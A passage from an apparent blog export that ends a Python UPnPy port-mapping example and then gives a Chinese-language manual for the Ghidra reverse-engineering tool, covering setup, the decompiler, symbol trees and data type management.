#&#123;&#x27;NewExternalIPAddress&#x27;: &#x27;10.100.40.182&#x27;&#125; \\#通过service.action[&#x27;name&#x27;].get_input_arguments()可以获取参数 service.DeletePortMapping.get_input_arguments() \\#[&#123;&#x27;name&#x27;: &#x27;NewRemoteHost&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewExternalPort&#x27;, &#x27;data_type&#x27;: &#x27;ui2&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewProtocol&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: [&#x27;TCP&#x27;, &#x27;UDP&#x27;]&#125;] \\#发送服务 service.AddPortMapping( NewRemoteHost=&#x27;&#x27;, NewExternalPort=80, NewProtocol=&#x27;TCP&#x27;, NewInternalPort=8000, NewInternalClient=&#x27;192.168.1.3&#x27;, NewEnabled=1, NewPortMappingDescription=&#x27;Test port mapping entry from UPnPy.&#x27;, NewLeaseDuration=0 )","categories":[],"tags":[],"keywords":[]},{"title":"","slug":"逆/ghidra","date":"2023-08-29T07:20:48.901Z","updated":"2023-08-29T07:21:08.020Z","comments":true,"path":"article/0.html","link":"","permalink":"http://example.com/article/0.html","excerpt":"","text":"1.1 Ghidra背景 1.1.1 什么是Ghidra Ghidra是一个由美国国家安全局（NSA）研究部门创造并维护的软件逆向工程框架。这个框架包括了一套完善的软件分析工具，涵盖了反汇编、汇编、反编译、图形化以及许多其他有用的功能。 美国国家安全局于2019年3月将Ghidra开源放出。Ghidra的官方GitHub项目地址在 https://github.com/NationalSecurityAgency/ghidra 。 图1-1 Ghidra的LOGO 1.1.2 为什么用Ghidra** (1) 基本功能 Ghidra涵盖了同类型工具如IDA Pro、Radare、Binary Ninja等所拥有的大部分功能，并将这些功能完善地整合在了一起。Ghidra也支持大量的处理器指令集与可执行格式。 (2) 兼容性 用Java编写的Ghidra能够在Windows、macOS、Linux等主流平台上运行。 (3) 对于团队作业的高度支持 软件逆向工程可以是非常庞大的任务。用户可以通过配置Ghidra Server来简易可靠地实现多个用户共同工作的目标。Ghidra Server提供了权限管理、版本管理等功能。我们会在后面的章节讲到有关Ghidra Server的具体操作。 (4) 定制化与高度可扩展性 Ghidra整合了许多的【插件】，每个插件提供特定的功能。【工具】（tools）则是插件与插件配置的集合。用户可以自定义插件与工具的配置、创建新的工具、编写自己的插件。从UI到功能的可自定义性，Ghidra能够满足绝大多数用户的需求。 (5) 操作撤回 这是Ghidra提供的一个虽然小巧却非常实用的功能，允许用户对操作进行撤回（Undo）和重做(Redo)。当然，操作的储存深度也是可以由用户自定义的。 图1-2 撤回与重做 (6) 开源 Ghidra在2019年3月之后已经被开源，协议为Apache License 2.0。该协议允许用户对代码进行更改与再发布。 图1-3 Ghidra的开源协议 而市面上主流的同类工具，以IDA Pro为例，则是价格不菲。 图1-4 IDA Pro售价 #ghidra使用手册 1.2 安装、配置环境与运行 1.2.1 配置要求 硬件 4GB RAM，1 GB 存储空间，双显示器或多显示器最佳 平台 Microsoft Windows 7 或 10 (64-bit) Linux (64-bit, CentOS 7 最佳) macOS (OS X) 10.8.3+ 不支持32位的操作系统 软件 Java 11 Runtime and Development Kit（JDK） 推荐使用的环境为OpenJDK 1.2.2 下载 用户可以于Ghidra官网（https://ghidra-sre.org/）下载Ghidra的最新压缩包（可能需要使用美国代理）。Ghidra没有使用传统的安装程序，直接提取文件就能使Ghidra发行版在文件系统中就位。使用该方法的好处是，不需要管理员权限便能够安装Ghidra来使用。另外，移除Ghidra只需要简单地删除Ghidra的安装目录。 图1-5 下载 1.2.3 配置环境 Ghidra需要特定版本的JDK位于PATH中才能够运行。如果PATH中的Java版本Ghidra并不支持，它将使用该版本的Java来寻找用户系统中受支持的Java版本。如果仍然找不到受支持的Java版本，用户会被要求输入一个Java的主目录以供使用。 Ghidra是通过OpenJDK进行的开发与测试，因此我们建议使用这个OpenJDK来获取最稳定的体验。 如果Ghidra由于PATH中没有任何版本的Java而不能运行，用户需要手动安装一个受支持的JDK并将其添加到PATH，以下是操作流程： (1) Windows 1 提取JDK发行版本(.zip文件)，之后 Windows 10: 右键点击左下角Windows键，然后点击【系统】 Windows 7: 点击左下角Windows键，右键点击【计算机】，点击【属性】 2 点击【系统信息】，之后点击【高级系统设置】 3 点击【环境变量】 4 在【系统变量】下方，选中Path，并点击【编辑】 5 在【编辑系统变量】的窗口中，在变量值的最后加入一个分号“;”，并接着输入&lt;JDK目录的路径&gt;bin 6 确认以上修改 (2) Linux 与macOS (OS X) 1 提取JDK。 tar xvf &lt;JDK文件.tar.gz&gt; 2 用编辑器打开~&#x2F;.bashrc，譬如 vi ~&#x2F;.bashrc 3 在文件最后，将JDK的bin目录加入PATH变量。 export PATH&#x3D;&lt;提取出的JDK目录路径&gt;&#x2F;bin:$PATH 4 保存文件。 5 重启所有终端来让改动生效。 在一些情况下，用户可能希望以特定版本的Java来启动Ghidra。我们设置support&#x2F;launch.properties中的JAVA_HOME_OVERRIDE。如果该属性被设置为一个不兼容的Java版本，Ghidra会自动定位一个兼容版本。需要注意的是，PATH中一定要存在某个Java来使JAVA_HOME_OVERRIDE属性生效。 图1-6 JAVA_HOME_OVERRIDE属性 1.2.4 运行 切换至 Ghidra 所在目录 (1) Windows 运行ghidraRun.bat (2) Linux 与macOS （OS X） 运行ghidraRun 在macOS上运行Ghidra，将显示如下主界面： #ghidra使用手册 1.3 初步的UI自定义 在创建第一个项目之前，我们可以先将图形UI做一些初步的调整。在窗口点击Edit，之后点击Tool Options，再选择Tool，现在我们可以在Swing Look And Feel这里选择我们想要的主题，也可以勾选Use Inverted Colors来实现反转颜色。请注意部分的主题配上颜色反转会出现菜单字体颜色太淡的问题。更改完成后需要重新启动Ghidra才能使设置生效。 图1-7 反转颜色与主题设置 #ghidra使用手册 1.4 第一个项目 配置好环境并运行Ghidra之后，我们可以点击File→New Project，或者使用快捷键Ctrl+N，来创建一个新项目。鉴于我们暂时先讲单人作业，选择Non-Shared Project，并接着输入项目目录与名称以完成项目的创建。 图1-8 完成项目创建 之后我们便可以开始导入文件，我们可以简单地将文件拖入Ghidra窗口，也可以选择File→Import File（快捷键I）来导入文件。 图1-9 导入文件 导入文件后，我们选择CodeBrowser（喷火的龙头图标）工具，也即是Ghidra自带的工具来打开文件。 图1-10 打开文件 CodeBrowser已经是一个非常强大的工具，我们会在下一章开始介绍它的功能。 #ghidra使用手册 2.1 界面介绍 在用CodeBrowser打开我们的文件后，由于是第一次打开，Ghidra会提醒我们，需不需要对文件进行分析，我们选Yes并且以默认的分析工具设置对文件进行分析（直接点选Analyze）。 图2-1 分析文件 图2-2 默认配置 分析的进度会在界面右下角显示。 在本章，我们会对CodeBrowser工具中所涵盖的各个内置插件进行逐一的介绍。 打开工具后，我们能看到显示着几个默认的窗口。在本章我们介绍位于界面中间最大的窗口，也是CodeBrowser中的主要窗口，Listing View。 图2-3 默认窗口 Listing View，我们接下来管他叫做【陈列窗口】，是展示程序指令和数据，并且与其交互的主要窗口。在下面的图中，陈列窗口展示了crackme_example程序的一部分。 图2-4 陈列窗口 陈列窗口展示了地址、字节、助记符、算子等信息。陈列窗口的整体结构可以通过Browser Field Formatter（我们会在2.2讨论它）来进行更改。该视窗默认显示整个程序的信息，在视窗大于屏幕大小的情况下（大部分的情况），我们都可以使用滚动条或者鼠标滚轮来进行视窗的上下移动。 此外，我们可以通过其他的Ghidra组件来将视窗展示内容限制在程序的某一个部分上。比如说，我们可以在Program Trees窗口中双击选中.rodata，即只读数据，这时陈列窗口便只显示.rodata段的内容了。 图2-5 只显示.rodata内容的陈列窗口 2.1.1 光标与选择 尽管陈列窗口不会对程序进行更改，它对于其他插件却非常重要。陈列窗口中一直保持着一个光标的位置，许多其他的插件需要作用于一个特定的地址，而这可以由陈列窗口中的光标来提供。比如，我们将光标放置于main函数中的一个位置， 图2-6 放置光标于main函数中 之后点击Windows→Function Graph（关于这个窗口本身我们会在本章的后面进行介绍），我们就能够看到main函数的图形化展示了。 图2-7 main的图形化展示 光标可以通过任意方向键，或者鼠标点击来进行移动。 此外，还有些插件作用于一个范围内的地址，所以我们还需要用到陈列窗口内的选择功能。我们可以按住鼠标左键拖动鼠标来进行选择，也可以在按住Shift按键的同时用方向键移动光标。 如果一段地址未被选中，按住Ctrl键并选中该段地址，可以将其添加到当前的选中范围中。反之，则可以将其从当前的选中范围中删除。 我们可以将选中的部分高亮显示。选中之后，右键点击，选择Program Highlight→Entire Selection，或者选中之后直接使用快捷键（Ctrl+H），便可以高亮显示该部分。 图2-8 高亮显示部分 之后在同一个菜单下，我们也可以取消高亮显示的效果。 我们也可以用鼠标中键点击一个区域，这样能高亮所选的文本，并且所有相同的文本都会被高亮显示。譬如说，我们中键点击一个MOV指令，我们会发现，所有的MOV指令都被高亮显示了。只有大小写、所有字符都与选中的文本相同才会被该功能匹配。 图2-9 中键高亮MOV 2.1.2 导向 陈列窗口提供了强大的导向功能。我们可以通过简单地双击地址或者标签来实现导向。如果想要前往的地址在程序内却不在当前视窗内，当前的视窗会延伸并涵盖至目标地址。 2.1.3 标记 Markers，我们称之为标记，指示着程序中一些特殊的位置。这些位置可以是用户自己添加的(Bookmarks)，也可以是某些Ghidra插件添加的。标记分为两种显示方式：边缘标记(Margin Marker)和导向标记(Navigation Marker)。 想要手动添加书签(Bookmarks)的话，我们可以将光标移动到指定位置，也可以选中一段地址，之后在右键菜单内点击Bookmark，或者使用快捷键Ctrl+D。 边缘标记 边缘标记位于陈列窗口的左侧，在当前展示的代码中指示位置。指示的位置可以是一个地址，也可以是一段地址。下图红框中标出的部分，便是边缘标记。 图2-10 边缘标记 导向标记 导向标记位于陈列窗口的右边。边缘标记只有处在展示的代码段中才会显示，而导向标记则会一直显示着当前整个视窗内所有的标记。因此，我们可以轻松地利用导向标记来在程序中进行导向。左键单击导向标记，陈列窗口中便会定位至标记的位置。 图2-11 导向标记 显示导向标记的区域竖直地分成两个部分，左边显示点标记，即是一个单独地址的标记。右半边显示区域标记，即是一段地址的标记。此外，我们还可以通过右键点击导向标记显示的区域来自定义显示的内容。 2.1.4 流程箭头 陈列窗口中的流程箭头图形化地展示了函数内的流程。Jump类指令的起点与终点都被用箭头连接了起来。有条件的跳转用虚线显示，而无条件的跳转用实线显示。 图2-12 流程箭头 我们可以利用流程箭头来导向，双击一个流程箭头便可以导向至该跳转的终点。如果我们的光标已经在终点的地址，双击流程箭头便可以导向至起点。 2.1.5 鼠标悬浮** 陈列窗口还提供了悬浮窗口，当鼠标悬浮在有额外信息的区域上时，悬浮窗口会自动出现。悬浮窗口让我们在不重定位显示窗口的前提下，能够看到想要的信息。 比如，我们将鼠标悬浮于地址之上，就会出现一个显示偏移的悬浮窗口。 图2-13 悬浮窗口 此外，悬浮窗口还作用于【内存引用】、【缩略文本】、【数据类型】、【函数名】以及【数量】上。 #ghidra使用手册 2.2 Decompiler 在CodeBrowser默认显示的窗口中，反编译窗口一样非常显眼。我们将先对Ghidra的反编译器本身进行介绍，对于其具体的操作则会在2.2.2当中说明。 2.2.1 反编译器 Ghidra自带复杂的转换引擎，能够将二进制表示的函数转化成更高层的C语言形式。Ghidra的反编译器包含以下功能： 1.还原表达式： 反编译器会进行完整的数据流分析从而对函数进行切离。由编译&#x2F;优化这个过程带来的复杂的表达式，会被还原成简单易读的形式。 2.还原高级变量： 反编译器会有效地还原最初程序所使用的变量，最小化引入新变量的需求。 3.还原函数参数： 反编译器会还原函数最初的形式。 4.自动命名 高级变量将会被合适地命名，数组的index值也会自动计算并用正确的格式显示出来，字符指针常量会被自动替换为对应的字符串。 5.自动引入数据类型与名称 当用户更改数据类型与名称的时候，反编译器会自动引入这些修改并应用，C语言输出也会随之更改。 6.局部类型传播 当信息不足的时候，反编译器会尽可能地提供相关的已知信息。因此，当遇到一个数据类型没有被确定的变量时，用户可以通过观察这个变量是如何被使用的，或者让已知的数据类型传播，来还原该变量的数据类型。 变量 反编译器会尝试结合不同位置的信息（堆、内存、寄存器）来决定函数内的变量。变量数据类型的信息也是由多个源头自动收集而来。比如，函数签名能够提供类型的信息。如果函数包含一个对全局内存位置的引用，而又有数据类型作用于这些位置上，反编译器也能从中得到信息。反编译器所得到的的信息越多，其产生出来的C代码便会更好。 未能够直接确定类型的变量可以通过局部类型传播来确定。我们往往只需要手动分配几个关键变量的类型，就能极大的提升C代码的可读性，因为反编译器可以通过局部类型传播来精确地分配其他数据类型。另外，手动分配函数签名中的类型，或是全局变量，会极为有效，因为这能同时影响多个函数。标明函数参数的数据类型非常有用。一个函数参数中定义了的数据类型会被传播到这个函数调用的所有函数当中。 如果你有程序所用API的C语言头文件，Ghidra提供了一个原型的C代码解析器。该解析器能够提取C代码中的数据类型信息并且创建一个Ghidra Data Type Archive(.gdt)文件。我们可以选择File→Parse C Source来打开该解析器。更多关于数据类型管理的内容，我们会在2.1.5中讲到。 反编译器内部函数 有时，反编译器会使用某个反编译器内部函数，这些函数没有被转化成像C代码的样子。出现这种情况通常说明产生的伪代码不正确，或者是需要被手动调整至更可读的输出。有时可能我们需要添加针对这种特定情况的额外简化规则。 SUB41(x,e) 截断操作 其中4代表着输入算子(x)的字节数，1代表着输出值的字节数。x为将被截断的值，e则是被截断的最低有效字节个数。举个例子： SUB42(0xaabbccdd,1)&#x3D;0xbbcc 当e的值为0时，该操作基本是对整数大小间的转换。 SUB41(x,0)通常是从int到char的转换 SUB42(x,0)是从int到short的转换 SUB84(x,4)可能是扩展精度乘法的一部分，但也可能出现在诸如除法的强度折减的其他操作当中。 CONCAT31(x,y) 连接两个算子 其中3代表x的字节数，1代表y的字节数。输出结果会是一个4字节的连接，x会组成结果的最高有效字节部分，而y会组成最低有效字节部分。例： CONCAT31（0xaabbcc,0xdd）&#x3D;0xaabbccdd 这个函数通常会在大小为1字节的变量(char)被储存于4字节的寄存器中出现。所有在4字节寄存器上的基本运算&#x2F;逻辑操作都能够正确地作用于1字节的变量，编译器只需要保证忽略寄存器中的3个最高有效字节。 CONCACT31被反编译器用来追踪这些被编译器忽略掉的最高有效字节。再多数情况下，反编译器能够做到这一点，然而在循环结构中却不行。这是由反编译器源代码所带来的难以解决的问题。 ZEXT14(x) 0的扩展 其中1代表x的字节数,4代表输出值的字节数。该函数绝大多数情况下是对小的整型到较大的无符号整型的转换。 SEXT14(x) 有符号的扩展 其中1代表x的字节数,4代表输出值的字节数。该函数绝大多数情况下是对小的有符号整型到较大的有符号整型的转换。 SBORROW4(x,y) 判断两数相减有无运算溢出 其中4代表x与y的字节数，x,y均为有符号整型。该函数在x-y会造成运算溢出的情况下返回true。该函数一般由两个有符号整型的比较中产生。尽管反编译器中有还原比较的规则，这是一个没有被涵盖到的特殊情况。 CARRY4(x,y) 判断x+y是否进位 SCARRY4(x,y)判断x+y是否导致有符号的溢出 其中4代表x与y的字节数。如果x+y导致进位，将会返回true。 寄存器设置 有时程序会使用一个寄存器来储存一个全局常数。我们可以在陈列窗口右键菜单中选择Set Register Values来指定该值。这个常数会自动传播到反编译器中的相关函数中，我们得到的C代码也可能因此被进一步简化。 图2-14 寄存器设置 反编译器选项 如下则是一些可用的反编译器分析选项(Edit→Tool Options→Decompiler&#x2F;Analysis): 图2-15 反编译器选项 Eliminate unreadable code：让反编译器去除它认为不可读的代码部分。 Ignore unimplemented instructions：让反编译器忽略那些语义被标记为未实现的指令。 Infer constant pointers：允许反编译器推断那些看起来像指针的常数的数据类型。如果常数的地址看起来像是程序中已知的数据或者函数，该常数会被假设为一个指针。 Respect read-only flags：让反编译器将被标记为只读的内存当作常数值。对那些真正只读，并且从未变化过的值，该段内存会被在Memory Manager中被标记为只读。 Simplify predication：使反编译器简化条件指令，合并使用相同判断条件的if else的代码段。 Simplify extended integer operations：使反编译器简化对整型的操作。当一个值被分为多个部分并在不同阶段操作时，反编译器会尝试将这些阶段合并，还原出单一的操作。 Use in-place assignment operators：使反编译器在输出中使用像+&#x3D;这样的分配操作符。 Decompiler Timeout(seconds)：设定允许有反编译器运行的秒数。目前这个时间设置不影响用户界面，用户界面会无止境的运行。这个设定目前只影响后台使用decompiler.syntax的分析进程。 2.2.2 反编译窗口 现在我们会开始介绍Ghidra反编译器所提供的用户界面，也就是反编译窗口（Decompiler Window）的使用。反编译窗口默认位于陈列窗口的右边。 图2-16 反编译窗口 如果窗口被关闭，我们也可以从Window→Decompile中将其打开。 鼠标活动 双击：导向至双击的标志 Ctrl+双击：在新窗口中导向至双击的标志 中键点击：高亮显示所有与所点击的目标相同的内容 复制 我们可以将反编译窗口中的C代码复制，选择需要复制的文本，并从右键菜单中选择Copy，也可以直接使用快捷键Ctrl+C。 重命名 我们可以重命名任意的参数或者变量，右键点击变量，选择Rename Variable（快捷键L），便可更改变量名。 图2-17 重命名变量 而重命名函数，需要点击函数名，右键菜单中选择Rename Function（快捷键L）。 重定义变量类型 尽管反编译器会尽可能地自动还原变量类型，它时常得不到足够的信息。我们可以手动变更一些变量的类型来改善所得到的C代码。右键点击变量，选择Retype Variable（快捷键Ctrl+L）。任何该程序已知的类型都可以使用。 图2-18 更改变量类型 一个简单有效的提升反编译器所生成的代码质量的方式是，找到函数有明显的字符串参数的函数，并将参数的类型改为char *。之后对任何对定义的内存的引用都会将所传递的参数显示为string。 编辑函数签名 右键菜单中选择Edit Function Signature，我们便可以更改函数签名。 图2-19 编辑函数签名 函数签名包括函数名、返回类型、参数个数、参数名、参数类型、变量参数（varargs）。 我们可以通过修改函数签名的字符串来修改以上任意内容。比如说，当我们发现某个函数实际上是printf的话，我们可以在输入void printf(char *x, …)。 另外，我们也可以选中Calling Convention（见图2-19）来从一系列可用的调用约定中选择。勾选inline以指示内联函数。勾选No Return以指示该函数不返回。 查找 右键菜单中的Find功能（Ctrl+F），支持在当前函数中对正则表达式或者字符串的查找。 导出成C代码 选择下图所示图标，可将当前反编译的函数导出。如果不指定文件扩展名，Ghidra会将其保存为.c文件。 图2-20 编辑函数签名 #ghidra使用手册 2.3 Program Tree管理窗口 Program Tree（以下称作“程序树”）管理窗口默认位于界面的左上角。程序树被用来将程序组织进一个树结构。我们可以用程序树中的节点在CodeBrowser中进行导向，我们也能够利用程序树限制CodeBrowser中所显示的内容（可参考2.1中关于限制当前视窗显示内容的部分）。程序树管理器可以创建、删除、重命名或关闭程序树的视图。 图2-21 程序树管理窗口 2.3.1 文件夹与分段 程序树将一个程序组织成文件夹与分段（folders and fragments）。分段包含着代码的单元，而代码单元只能存在于一个且只有一个分段中。文件夹则可以包含分段和其他文件夹。这里所说的文件夹不像文件系统当中的文件夹，除了根文件夹之外的任意文件夹，和分段，都可以有不止一个的父文件夹。当用户将一个文件夹或分段（暂且称之为A）复制到另一个父文件夹下时，不会有新的A被创建，而是目标文件夹会被添加为A的另一文件夹。 创建文件夹 1 右键选择窗口中的一个文件夹 2 右键菜单中选中Create Folder 创建分段 1 右键选择窗口中的一个文件夹 2 右键菜单中选择Create Fragment 我们也可以通过拖动陈列窗口中的代码单元来创建分段，只需拖动选中的代码单元到一个文件夹。该新建的分段的名称将会由所选代码单元中的第一个地址名称所决定。如果拖动的代码单元有标签，分段的名称将会被默认地设为标签名。 删除 满足以下两种情况之一时，我们才能够删除文件夹或分段A。 1 A是空的。 2 A存在于其他的文件夹中。 右键选择Delete以将其删除。 排序 用户可以选择以地址或名称顺序对程序树中内容进行排序。 1 右键选择一个文件夹 2 Sort→by Address（以地址顺序），Sort→by Name（以名称顺序）。 #ghidra使用手册 2.4 Symbol Tree 窗口 Symbol Tree窗口，以下称作符号树窗口，将程序分为五个大类显示：Externals、Function、Labels、Classes与Namespaces。 符号树窗口默认显示于程序树窗口下方，如果关闭后想将其重新打开，选择Window→Symbol Tree。 图2-22 程序树管理窗口 2.4.1 显示 我们将对上图中可见到的类别一一介绍。 Imports Imports类别包含了代表外部库命名空间的符号。库名被预留以放置那些还没有与特定的库关联的外部符号。 图2-23 Exports Exports包含了那些代表导出的入口点的符号。 Functions Functions包含了代表程序中函数的符号（除外部函数）。我们可以打开一个函数的符号来显示它的参数和变量符号。 图2-24 显示参数与变量 Labels 所有Labels类别中的符号都处于全局命名空间中。 Class Class包含了那些可能包含函数命名空间或标记符号的类的命名空间。 Namespace Namespace包含了处于全局命名空间中的通用命名空间，也可能包含类、函数、标记、或其他命名空间。 2.4.2 创建库 用户可以创建一个库的名字并将其指代一个外部库。这个名字因此就可以与程序（或库）相关联并允许用户进行导向或阅读代码。右键点击Imports文件夹并选择Create Library。所创建的库默认名称会是NewLibrary。 2.4.3 设置外部程序 右键点击你想要的关联的Imports文件夹中的库，并选择Set External Program，这将弹出一个选择外部程序的会话，我们可以在该会话中选择想关联的外部程序（或库）。之后，用户便能够对外部引用进行导向或阅读代码。 2.4.4 外部位置 右键点击某个库，并选择Create External Location，便会弹出一个创建外部位置的对话(如下图)。External Program Path，即是程序对应的库，在项目中有关联程序的情况下会被自动填充。另外的情况下，我们可以从Edit手动选择。我们需要为外部位置指定Label（标签）或是Address（地址）。勾选Make External Function将创建一个外部函数。不勾选的情况下，一个非函数的外部位置将被创建。 图2-25 创建外部位置 在上图所显示的对话中，我们创建了一个外部函数，被标记为A_Label，位于Lib中的地址0xdeadbeef。这个库的名称Lib，则将会与项目中的lib_example文件相关联。 与上述操作类似，我们可以对外部位置进行编辑。右键选择外部位置&#x2F;外部函数并选择便可以调出编辑外部位置的对话。 如果我们选中一个外部位置的标志，会被导向至一个外部的引用源，该引用源指向外部位置。如果想要真正地导向到这个外部位置，右键点击标志并选择Go To External Location。 2.4.5 创建类与命名空间 右键选中一个父命名空间并选择Create Class选项。所有在Class类别中的类，都在全局命名空间中。 相似地，我们可以在全局命名空间、类、或者其他命名空间中创建命名空间。右键点击父命名空间并选择Create Namespace。所有在Namespace类别中的命名空间，都在全局命名空间中。 #ghidra使用手册 2.5 Data Type 管理器 Data Type Manager，以下称为“数据类型管理器”，让用户能够定位、组织数据类型，也能够将数据类型应用于程序。Ghidra的一个长期的目标，便是让用户能够搭建数据类型的库，并在不同的程序、项目甚至用户之间分享使用。 2.5.1 基本概念 数据类型 Ghidra支持三类数据类型：Built-in、user defined、derived。 类型 描述 Built-in 直接由Java实现并被用于基本的标准类型，比如byte、word、string等等，不能被改变或重命名。 User Defined 有四个用户定义（user defined）的数据类型，分别是Structures、Unions、Enums和Typedefs，可以被创建、修改及重命名。 Derived 两种派生的数据类型：Pointers（指针）和Arrays（数组），可以被创建与删除，但是名字由其基本类型决定。 数据类型档案 数据类型档案被用于在程序、项目和用户间打包并分享数据类型。有两种用户创建的档案类型：文件数据类型档案（File data type archives）和项目数据类型档案（Project data type archives）。数据类型档案可以在数据类型管理器中访问。一个被打开的数据类型档案将会被显示为数据类型管理树中的一个节点。档案可以被用户手动打开，也可以被引用它的程序自动打开。 内置数据类型档案 Built-in档案，即内置数据类型档案，总会出现在数据类型管理器中。它支持对所有Ghidra 内置数据类型的访问。 图2-26 内置数据类型档案 文件数据类型档案 文件数据类型档案，以下简称为“文件档案”，将数据类型储存于扩展名为.gdt的文件中，可以位于文件系统中的任意位置。在被分享使用的文件系统中，文件档案可以被多个用户同时打开，但是只有其中一个用户能够打开并对其做修改。 项目数据类型档案 项目数据类型档案，以下简称为“项目档案”，将数据类型与其他程序一起，储存于Ghidra项目数据库目录当中。Ghidra项目窗口会将项目中的项目档案如同其他程序一样展示。项目档案可以被记录版本并可在多用户环境中共用。 程序中的数据类型 除了存储于档案中，数据类型也能被存于程序内部。任何在程序中使用的数据类型一定会被存储于程序当中，即使它最初来自于某个档案。 图2-27 程序中的数据类型 应用数据类型** 将数据类型应用于程序当中是我们的主要目的。数据类型可以被应用于内存上的位置，来让Ghidra知道该位置中的那些字节究竟是什么。数据类型也可以用来描述函数的参数和局部变量。 我们可以通过拖动数据类型至陈列窗口中的某个元素，来应用该数据类型。我们会在后面的章节中更细致的介绍应用数据类型的其他方法。 当一个来自于档案中的数据类型被应用于某个程序时，一份该数据类型的拷贝会在该程序中产生。我们将产生这份拷贝的过程称之为“解析”（resolving）。这是一个复杂的过程，因为数据类型可以包含或引用其他的数据类型。这些引用的数据类型既可能存在，也可能不存在于该程序中，而解析的过程要考虑到这些情况。有时，程序中可能存在与需要解析的数据类型同名的类型。即使这两个产生冲突的数据类型一致，Ghidra也难以对其进行判断与处理。通常来说，Ghidra会通过重命名新的类型，将.conflict添加到这个新的数据类型名称之后，来解决这类问题。对于许多从数据类型管理器触发的操作来说，冲突的解决办法由当前的“数据类型冲突模式”（Data Type Conflict Mode）决定。添加一个单一的数据类型往往会导致许多新的数据类型被添加到程序当中。 2.5.2 数据类型档案操作 在2.5.1当中，我们已经知道用户创建的数据类型档案分为文件档案与项目档案。通常来说，文件档案会被以只读模式打开，而项目档案会被打开用于编辑。项目档案支持分享与版本控制，因此允许多个用户同时对其进行更改。而文件档案同时只允许一个用户进行编辑。 图2-28 在倒三角菜单中，选择对档案的操作 文件档案 在上图中，我们可以看到一系列关于档案操作的选项。选择New File Archive…，便会出现一个文件选择对话。选择一个目录并输入新档案的名称。一个新的档案便会出现在数据类型管理器当中。 如果想要打开文件档案，选择Open File Archive…，后面的操作与上述操作类似。 文件档案打开后，不能直接用于编辑。如果想对其进行编辑，我们需要右键点击该档案并选择Open for Editing。如果其他用户正在对该档案进行编辑，这个操作会失败，我们会被提示有其他用户正在编辑该档案。 档案中未保存的更改会被加上*符号来提醒用户。我们可以右键点击编辑的档案，并选择Save Archive来对其进行保存。也可以选择Save As…将编辑的档案保存在新的文件当中。 当不再需要编辑该文件档案时，我们应将该档案转变回只读模式。右键点击该档案并选择Close for Editing。 项目档案 选择New Project Archive…，并在出现的对话中选择一个文件夹，输入新档案的名称。我们也可以简单地将.gdt文件，即文件档案，拖入Ghidra项目窗口中，这也能够添加新的项目档案。 如果想要打开项目档案，选择Open Project Archive…，后面的操作与上述操作类似。 2.5.3 数据类型操作** 数据类型是档案中真正有用的内容。数据类型可以被应用于程序，并丰富其中数据、参数、局部变量和函数返回类型的意义。用户定义的数据类型可以变得十分复杂，但他们最终都是基于内置数据类型。 将数据类型应用于程序 用户可以通过以下两种方法应用数据类型。 1 拖动：我们可以通过将数据类型拖动于陈列窗口的相应元素上来应用数据类型。在下图中，我们将内置类型中的int拖动到函数名main上，便可以将int类型应用于main函数的返回值。 图2-29 拖动数据类型 2 陈列窗口中进行应用：在陈列窗口中，右键点击某一元素，选择Set Data Type，便可以从提供的常用数据类型中进行选择。我们也可以直接选中元素，并按快捷键T，来调出选择数据类型的对话。 图2-30 陈列窗口中进行操作 需要注意的是，从档案中应用数据类型会自动将该数据类型添加至本程序的档案中。该档案也会被自动与该程序关联，以后打开这个程序时，该档案也会被打开。 创建用户定义数据类型 有七种用户可以创建的数据类型：Structures、Unions、Enums、Function Definitions、Typedefs和Pointers。 右键点击想要创建新类型的目录，选择New→Structure，New→Union，New→Enum，New→Function Definition来创建对应的数据类型。下图是创建新的Structure的示例。 图2-31 创建新的Structure 创建typedef更加简单，右键选择需要被typedef的数据类型（称之为A），选择New→Typedef on A。此外，我们还可以选择New→Typedef…来调出一个完整的对话窗口。 图2-32 通过完整对话窗口创建新的Typedef 类似地，如果想创建一个Pointer，选择New→Pointer to A。需要注意的是，我们不能对内置数据类型的目录进行更改。所以如果我们在内置数据类型目录下创建Pointer或Typedef，所生成的数据类型会被放置于程序的数据类型根目录下。 编辑数据类型 只有Structure，Union，Enums和Function Definitions能够被编辑。在数据类型管理器中双击或右键并选择Edit这类节点，便可以打开对应的编辑器。 从所选枚举类型创建新的枚举类型 我们可以通过选择两个或以上的枚举类型（Enums），再选择Create Enum form Selection。输入新的Enum的名字便可以完成创建。所得的Enum会包含所选的Enums的名称与值。需要注意的是，如果所选枚举中含有相同的值，这些值都会被添加至新的枚举中。然而，只有第一个该值将在应用时生效。 图2-33 从所选枚举类型创建新的枚举类型 删除，移动与复制 我们可以右键点击选择Delete来对数据类型进行删除。一个确认的对话窗口将会弹出，提醒用户该操作不能被撤回。 图2-34 不能用Undo功能撤回 数据类型只可以在同一个档案中移动，如果想在不同档案间移动数据类型，该数据类型会被复制。我们可以通过两种方法移动一个数据类型： 1 拖动 2 剪切&#x2F;粘贴：右键点击想要移动的数据类型，并选择Cut，之后右键点击目标父目录并选择Paste。 数据类型可以在一个档案之中进行复制，也可以从一个档案复制至另一个档案。然而在这两种情况下，复制的行为其实是不同的。当在一个档案之中进行复制时，源数据类型的一个复制自然地被放置在目标目录下。然而当在不同档案间进行复制时，任何包含于所复制的数据类型中的数据类型都会被按照相对路径复制到目标档案之中。 相似地，我们有两种办法复制一个数据类型。 1 拖动 2 复制&#x2F;粘贴：右键点击想要移动的数据类型，并选择Copy，之后右键点击目标父目录并选择Paste 对齐数据类型 右键点击想要进行对齐操作的Structure或Union，并选择Align。 承认对源档案的改动 如果我们作出了对与源档案有关联的数据类型的改动，这些改动需要被应用至源档案以确保不同位置的数据类型是同步的。右键点击想要承认改动的数据类型，并选择Commit to Archive，改动便将被应用至源档案之中。 从源档案更新数据类型 如果我们对源档案当中的数据类型作出了改变，而这些数据类型又有所关联的数据类型存在于其他档案或是程序的档案当中，我们便需要从源档案当中更新数据类型。右键点击想要更新的数据类型，并选择Update From Archive。 取消改动 如果我们作出了对与源档案有关联的数据类型的改动，但不想保留且应用这些改动，我们可以将其返回至最初的状态。右键点击数据类型并选择Revert便能移除改动。 关联&#x2F;取消关联 